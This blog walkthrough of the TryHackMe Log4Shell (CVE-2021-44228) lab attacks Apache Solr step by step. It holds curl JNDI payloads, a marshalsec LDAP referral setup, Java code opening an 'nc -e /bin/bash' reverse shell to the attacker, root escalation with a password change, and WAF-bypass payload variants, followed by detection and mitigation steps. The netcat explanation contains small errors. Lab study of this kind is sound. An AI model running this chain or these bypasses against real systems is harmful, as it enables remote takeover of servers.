            <p>The Apache Log4j vulnerability was discovered around December 10, 2021, and has been all over the
                internet in the past couple of weeksâ€”and rightfully so. Log4j is a Java-based logging tool used by
                well-known systems and services such as Amazon, Microsoft Azure, Minecraft, VMware, Cisco, Splunk, and
                many more. To make matters worse, this was a zero-day vulnerability, meaning that services knew about
                the vulnerability but had not released a patch for it yet. This also means that all these systems and
                services could have been exploited through the Log4j vulnerability at any given time until a patch could
                be released. Log4j was assigned the identification CVE-2021-44228 for its remote code execution
                vulnerability. It also has a Denial-of-Service (DoS) vulnerability categorized as CVE-2021-45046.</p>

            <p>In this blog, I will be following TryHackMe and <a href="https://tryhackme.com/r/room/solar"
                    target="_blank" rel="noopener noreferrer">John Hammond's room</a>, which focuses on testing,
                exploiting, and mitigating the vulnerability CVE-2021-44228. In this lab, a web-based virtual machine
                provided by TryHackMe will be used. A machine that will be targeted has software installed that uses
                Log4j. An IP address of the target machine is provided, and some reconnaissance has to be done to
                discover where the Log4j vulnerability is.</p>

            <h2>Reconnaissance</h2>
            <p>To start off, a terminal will be opened, and we want to know what ports are open and available on this
                machine. To do this, we need to perform a scan on the IP, and Nmap is the perfect tool to do so.</p>

            <pre><code>nmap -v -p- TARGET.MACHINE.IP.ADDRESS</code></pre>

            <p>To run normally, we don't need any switches, but to get the output we want, we need the <code>-v</code>
                and <code>-p-</code> switches. Why? The <code>-v</code> switch increases the verbosity level, meaning
                that the scan will give us more information in the output. The switch <code>-p-</code> is key here
                because it allows us to scan all ports on the given IP. After the switches, we specify the IP of the
                target machine. Now, running this scan, we get the output as shown below.</p>

            <figure>
                <img src="../images/nmap_scan_output.jpg" alt="Nmap Scan Output">
            </figure>
            <br>

            <p>We see that there are a total of 65,532 closed ports and 3 open ports. Port 22 utilizes the "ssh"
                service, and port 111 carries the "rpcbind" service. Both of these services do not use Log4j. Only one
                other port is open, and that is 8983, but there is one problem. Under the service tab, we notice that
                the service is unknown. This means that we will not know if the service utilizes Log4j or not. We can
                try to solve this with this new Nmap command.</p>

            <pre><code>nmap -sV -p 8983 TARGET.MACHINE.IP.ADDRESS</code></pre>

            <p>In this new command, the switch <code>-sV</code> was added, and it attempts to find the exact version of
                a service running on a target machine. The switch <code>-p</code> followed by the unknown service's port
                number is also added. The <code>-p</code> switch simply allows you to specify a port number in the
                command to run a scan against. After running this scan, we get the output as shown below.</p>

            <figure>
                <img src="../images/nmap_service_version.jpg" alt="Nmap Service Version">
            </figure>
            <br>

            <p>We notice that we actually receive the service name of HTTP and a version of Apache Solr. The actual
                service for this port is Apache Solr, and this service does indeed utilize Log4j in its software.</p>

            <h2>Discovery</h2>
            <p>After finding out what kind of software utilizes Log4j on the target machine, let's check out Apache
                Solr's web interface.</p>

            <figure>
                <img src="../images/apache_solr_interface.jpg" alt="Apache Solr Interface">
            </figure>
            <br>

            <p>On the dashboard, there are tons of arguments displayed, but the main one that we are interested in is
                <code>/var/solr/logs</code> because that is where Solr stores its logs.
            </p>

            <figure>
                <img src="../images/solr_logs_directory.jpg" alt="Solr Logs Directory">
            </figure>
            <br>

            <p>After looking at an example log file named <code>solr.log</code>, it can be found that there is a large
                number of repeated requests to the endpoint path <code>/admin/cores</code>.</p>

            <figure>
                <img src="../images/solr_log_entries.jpg" alt="Solr Log Entries">
            </figure>
            <br>

            <p>Now, we are looking for some kind of possible data entry point that a user can control.</p>

            <figure>
                <img src="../images/solr_params_field.jpg" alt="Solr Params Field">
            </figure>
            <br>

            <p>Among the log entries above, we can see a couple of lines that are different from the rest. Almost every
                line has a blank "params" field, but a couple have that same field with <code>id=1337</code> in them.
                This means that there could possibly be a way that the field can be exploited by passing in something
                malicious.</p>

            <h2>Proof of Concept</h2>
            <p>The endpoint that we discovered previously can be viewed through a web interface as shown below.</p>

            <figure>
                <img src="../images/solr_endpoint.jpg" alt="Solr Endpoint">
            </figure>
            <br>

            <p>Log4j itself is a logging utility, but to add more information to its logs, it parses information to
                these logs, and this is basically where the vulnerability is. There are other forms of syntax that may
                be executed, such as:</p>

            <p>Some examples of this syntax given by John Hammond in the TryHackMe room are:</p>
            <ul>
                <li><code>${sys:os.name}</code></li>
                <li><code>${sys:user.name}</code></li>
                <li><code>${log4j:configParentLocation}</code></li>
                <li><code>${env:PATH}</code></li>
                <li><code>${env:HOSTNAME}</code></li>
                <li><code>${java:version}</code></li>
            </ul>

            <p>The general payload that exploits the Log4j vulnerability is as follows:</p>

            <pre><code>${jndi:ldap://ATTACKERCONTROLLEDHOST}</code></pre>

            <p>Java Naming and Directory Interface (JNDI) is an application programming interface (API), and Log4j uses
                this for functionality. A Lightweight Directory Access Protocol (LDAP) is used as a server to reach out
                to <code>ATTACKERCONTROLLEDHOST</code>. With this payload, a malicious attacker can inject codeâ€”and that
                is always bad.</p>

            <p>Now, we're getting closer to the exploitation task of this lab, but we have to prepare the environment.
            </p>

            <p>The first thing that we need to know is the IP address of our machine, and that can be done through the
                following command:</p>

            <pre><code>ip addr show</code></pre>

            <p>The next preparation step is to create a connection to a service that listens on any port. The following
                command will do just that:</p>

            <pre><code>nc -lnvp 9999</code></pre>

            <p>The above command uses the Netcat utility as a port listener by sending over UDP packets to a specific
                port. This command uses 5 flags in total. The <code>-l</code> flag is used to tell Netcat to listen for
                a connection. The <code>-n</code> flag tells Netcat not to do any Domain Name System (DNS) or service
                lookups. The <code>-v</code> flag is used to increase verbosity, or display more information in the
                output as explained previously. Finally, the <code>-p</code> flag is used to specify a specific port,
                and in this example, I am using port 9999; however, you can use any port you'd like here.</p>

            <p>After executing the above command, I received the following output:</p>

            <figure>
                <img src="../images/netcat_listener.jpg" alt="Netcat Listener">
            </figure>
            <br>

            <p>This is great news because we are successfully listening. It states that we are listening on
                <code>[0.0.0.0]</code>, which means all addresses. It also specifies that we are listening on port 9999
                like we wanted to. We need to keep this command running while we perform exploitation, so let's open a
                new terminal. To make things easier, I used tmux, a terminal multiplexer that allows me to view two
                screens at once. You can also use other terminal multiplexers such as GNU Screen, Konsole, or many
                others.
            </p>

            <p>Now, we have to run an HTTP GET request to receive data with the following one-line command:</p>

            <pre><code>curl 'http://TARGET.MACHINE.IP.ADDRESS:8983/solr/admin/cores?foo=${jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999}'</code></pre>

            <p>Client URL, or <code>curl</code>, is a utility that allows you to transfer data over a network. Here, we
                are trying to receive a connection from Solr through the payload that we mentioned earlier. After
                running this command, we successfully receive a connection as shown below.</p>

            <figure>
                <img src="../images/received_connection.jpg" alt="Received Connection">
            </figure>
            <br>

            <p>Since we successfully received a connection, this means that our target is definitely vulnerable. We can
                now stop the Netcat listener.</p>

            <h2>Exploitation</h2>
            <p>We previously saw that the target machine is vulnerable and can be exploited. We were previously only
                listening with an LDAP request. Now, the first thing that we have to do is start an HTTP server. In this
                case, I will be doing it with Python 3 using the following command:</p>

            <pre><code>python3 -m http.server</code></pre>

            <p>The <code>-m</code> in this command is used to specify a moduleâ€”in which we specified
                <code>http.server</code>. The <code>http.server</code> module is used to start a simple local HTTP
                server. The server will be serving on port 8000. After running this command, we successfully start our
                local server as shown below.
            </p>

            <figure>
                <img src="../images/http_server_started.jpg" alt="HTTP Server Started">
            </figure>
            <br>

            <p>You do not have to keep the above command running yet. This was run for testing purposes to ensure that
                it is run correctly.</p>

            <p>We now need to obtain an LDAP Referral Server, which will basically allow us to send our HTTP GET request
                that we sent earlier somewhere else. After this, we can send in another payload to allow us to inject
                code into the target machine. John Hammond in the TryHackMe room breaks this down into three steps:</p>
            <ol>
                <li><code>${jndi:ldap://attackerserver:1389/Resource}</code> &rarr; reaches out to our LDAP Referral
                    Server</li>
                <li>LDAP Referral Server springboards the request to a secondary
                    <code>http://attackerserver/resource</code>
                </li>
                <li>The victim retrieves and executes the code present in <code>http://attackerserver/resource</code>
                </li>
            </ol>

            <p>To stage an LDAP referral server, we will be using the <code>marshalsec</code> utility. By using
                TryHackMe's attackbox, <code>marshalsec</code> is already pre-installed but can be installed <a
                    href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener noreferrer">here</a>.
                Now, we need to navigate to the directory where <code>marshalsec</code> is installed and run the
                following command to build the utility:</p>

            <pre><code>mvn clean package -DskipTests</code></pre>

            <p>To start an LDAP referral server, we will run the following one-line command using Java 8:</p>

            <pre><code>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"</code></pre>

            <p>After running this command, we get the following output to the terminal:</p>

            <figure>
                <img src="../images/ldap_referral_server.jpg" alt="LDAP Referral Server">
            </figure>
            <br>

            <p>This means that we have successfully created an LDAP server, and it is waiting. We need to keep this
                server running, so let's open a new terminal session to send our second payload.</p>

            <p>In this new terminal session, we want to write some code in Java. Let's move to a different directory and
                create a Java file named <code>Exploit.java</code>. You can use any text editor like Vim, Nano, or any
                that you prefer. I personally use Vim, so the following command is what I used to create our
                <code>Exploit.java</code> file:
            </p>

            <pre><code>vim Exploit.java</code></pre>

            <p>After entering the text editor for your <code>Exploit.java</code> file, you will want to enter in the
                following lines of code and replace <code>YOUR.ATTACKER.IP.ADDRESS</code> with your IP address. You may
                also want to replace the port number with the one that you used earlier of your choosing.</p>

            <pre><code>import java.io.IOException;

public class Exploit {
    public Exploit() {
        try {
            Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}</code></pre>

            <p>This code is basically allowing us to run <code>nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999</code> as a
                command in a shell. The command is driven with Netcat, and it is going to be executed on the target and
                tell its machine to call back to our machine. After saving this code, we will want to compile it with
                the following command in the terminal:</p>

            <pre><code>javac Exploit.java -source 8 -target 8</code></pre>

            <p>It will have now created a new file named <code>Exploit.class</code>. You can verify that a new file has
                been created by typing the <code>ls</code> command into the terminal as shown below.</p>

            <figure>
                <img src="../images/exploit_class_created.jpg" alt="Exploit.class Created">
            </figure>
            <br>

            <p>Now, we want to start our HTTP server with Python 3 as we mentioned earlier with the following command:
            </p>

            <pre><code>python3 -m http.server</code></pre>

            <figure>
                <img src="../images/http_server_running.jpg" alt="HTTP Server Running">
            </figure>
            <br>

            <p>After leaving the above HTTP server running, we now need a third terminal session open to prepare a
                Netcat listener to catch a reverse shell with the following command. Note, you can swap 9999 with the
                port you have chosen to use:</p>

            <pre><code>nc -lnvp 9999</code></pre>

            <figure>
                <img src="../images/netcat_listener_ready.jpg" alt="Netcat Listener Ready">
            </figure>
            <br>

            <p>The syntax of the above Netcat command was reviewed earlier, so I won't go over it again. We should now
                have one terminal session open with our LDAP referral server, a second with our HTTP server, and a third
                with a Netcat listener.</p>

            <p>We now need a fourth terminal session open to trigger the exploit that we created and open up a reverse
                shell prompt. Let's run the following one-line command in our fourth session to do so:</p>

            <pre><code>curl 'http://TARGET.MACHINE.IP.ADDRESS:8983/solr/admin/cores?foo=${jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit}'</code></pre>

            <p>After running this command, we have successfully exploited the victim machine as shown below!</p>

            <figure>
                <img src="../images/reverse_shell_obtained.jpg" alt="Reverse Shell Obtained">
            </figure>
            <br>

            <p>The Netcat terminal window should allow us to enter commands to the victim machine. Thus, we have
                exploited Log4j on Apache Solr!</p>

            <h2>Persistence</h2>
            <p>Since we have shell access to the victim machine, we can do pretty much anything that we want. Let's run
                the following command to check what user we are logged into. Note, this will be done in the Netcat
                terminal window:</p>

            <pre><code>whoami</code></pre>

            <figure>
                <img src="../images/whoami_output.jpg" alt="Whoami Output">
            </figure>
            <br>

            <p>From here, we can see that we are under the profile username of <code>solr</code>.</p>

            <p>If we want to check if we have superuser permissions, we can run the following command:</p>

            <pre><code>sudo -l</code></pre>

            <p>For Secure Shell Protocol (SSH) access, we want to become root and change the password of the
                <code>solr</code> account that we are currently on with the following two commands:
            </p>

            <pre><code>sudo bash
passwd solr</code></pre>

            <p>Now, we can use our fourth terminal window to SSH into the victim machine and enter any commands of our
                choosing remotely. This can be done with the following command:</p>

            <pre><code>ssh solr@TARGET.MACHINE.IP.ADDRESS</code></pre>

            <h2>Detection</h2>
            <p>On a vulnerable machine, we can explore log files to see if it has been exploited. From a previous step,
                we found out that log files are stored in the directory <code>/var/solr/logs</code> for Apache Solr. On
                the victim machine that we just exploited, we can navigate to that directory through SSH or a reverse
                shell, and we see the below log entry:</p>

            <figure>
                <img src="../images/log4j_exploit_log.jpg" alt="Log4j Exploit Log">
            </figure>
            <br>

            <p>Notice how when we reviewed logs earlier, we discussed how code can be injected into <code>params</code>?
                We can see that our JNDI syntax was successfully placed into it. This is one of the biggest ways that
                you can detect someone exploiting the Log4j vulnerability.</p>

            <h2>Bypasses</h2>
            <p>The payload that we used in this lab can be powerful in some cases, but it gets easily caught by Web
                Application Firewalls (WAFs). There are a ton of stronger bypasses that can be used to give you a better
                chance at avoiding these WAFs. For example, you can use the below bypasses for better chances at
                exploiting Log4j:</p>

            <pre><code>${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/}</code></pre>

            <h2>Mitigation</h2>
            <p>Now, we want to mitigate this vulnerability the best that we can against the exploit that we have been
                using previously. You can review mitigation techniques at Apache Solr's website, or click <a
                    href="https://solr.apache.org/security.html" target="_blank" rel="noopener noreferrer">here</a>. One
                technique is to modify the <code>solr.in.sh</code> file in the target's filesystem. Let's SSH back into
                the target machine, and we can find this file with the following command:</p>

            <pre><code>locate solr.in.sh</code></pre>

            <p>After locating the file, we can open it up with a text editor and insert the following line of code at
                the bottom of the file. Note, if you are not root, you will need to specify <code>sudo</code> before you
                edit the file in order to save changes:</p>

            <pre><code>SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"</code></pre>

            <figure>
                <img src="../images/solr_in_sh_modified.jpg" alt="solr.in.sh Modified">
            </figure>
            <br>

            <p>After saving the modified file, we need to restart the Solr service for the changes to take effect. We
                can do this with the following command:</p>

            <pre><code>sudo /etc/init.d/solr restart</code></pre>

            <p>Now, we want to make sure that we have successfully applied this mitigation technique. We can do this by
                attempting to break into the victim machine once more. Let's start back up the LDAP referral server,
                HTTP server, and Netcat listener the same way as before. After starting them back up, we can start the
                same JNDI payload attack with the <code>curl</code> command we used previously.</p>

            <figure>
                <img src="../images/exploit_attempt_after_mitigation.jpg" alt="Exploit Attempt After Mitigation">
            </figure>
            <br>

            <p>Notice how we do not get any response from the Netcat listener? I also typed in a <code>whoami</code>
                command to verify that it is not connected, and nothing showed up. This means that we have successfully
                implemented this mitigation technique.</p>

            <h2>Patching</h2>
            <p>On December 17, 2021, Apache finally released a patch for Log4j, ending sleepless nights for many
                security professionals. However, Log4j is not completely safe just yet. My assumption is that this
                vulnerability will take many years to ever be fully safe because of how many ways it can be exploited
                even after this most recent patch. Researchers and professionals will continue to look for ways to make
                this vulnerability safer in the coming years. Make sure that you and others update the logging-log4j
                package to version 2.17.0 as soon as possible if you discover that you have the package anywhere in your
                systems.</p>

            <h2>Conclusion</h2>
            <p>I want to thank John Hammond and TryHackMe for putting so much effort into this room and making it
                possible for me to explore and learn about how CVE-2021-44228 works as a whole.</p>
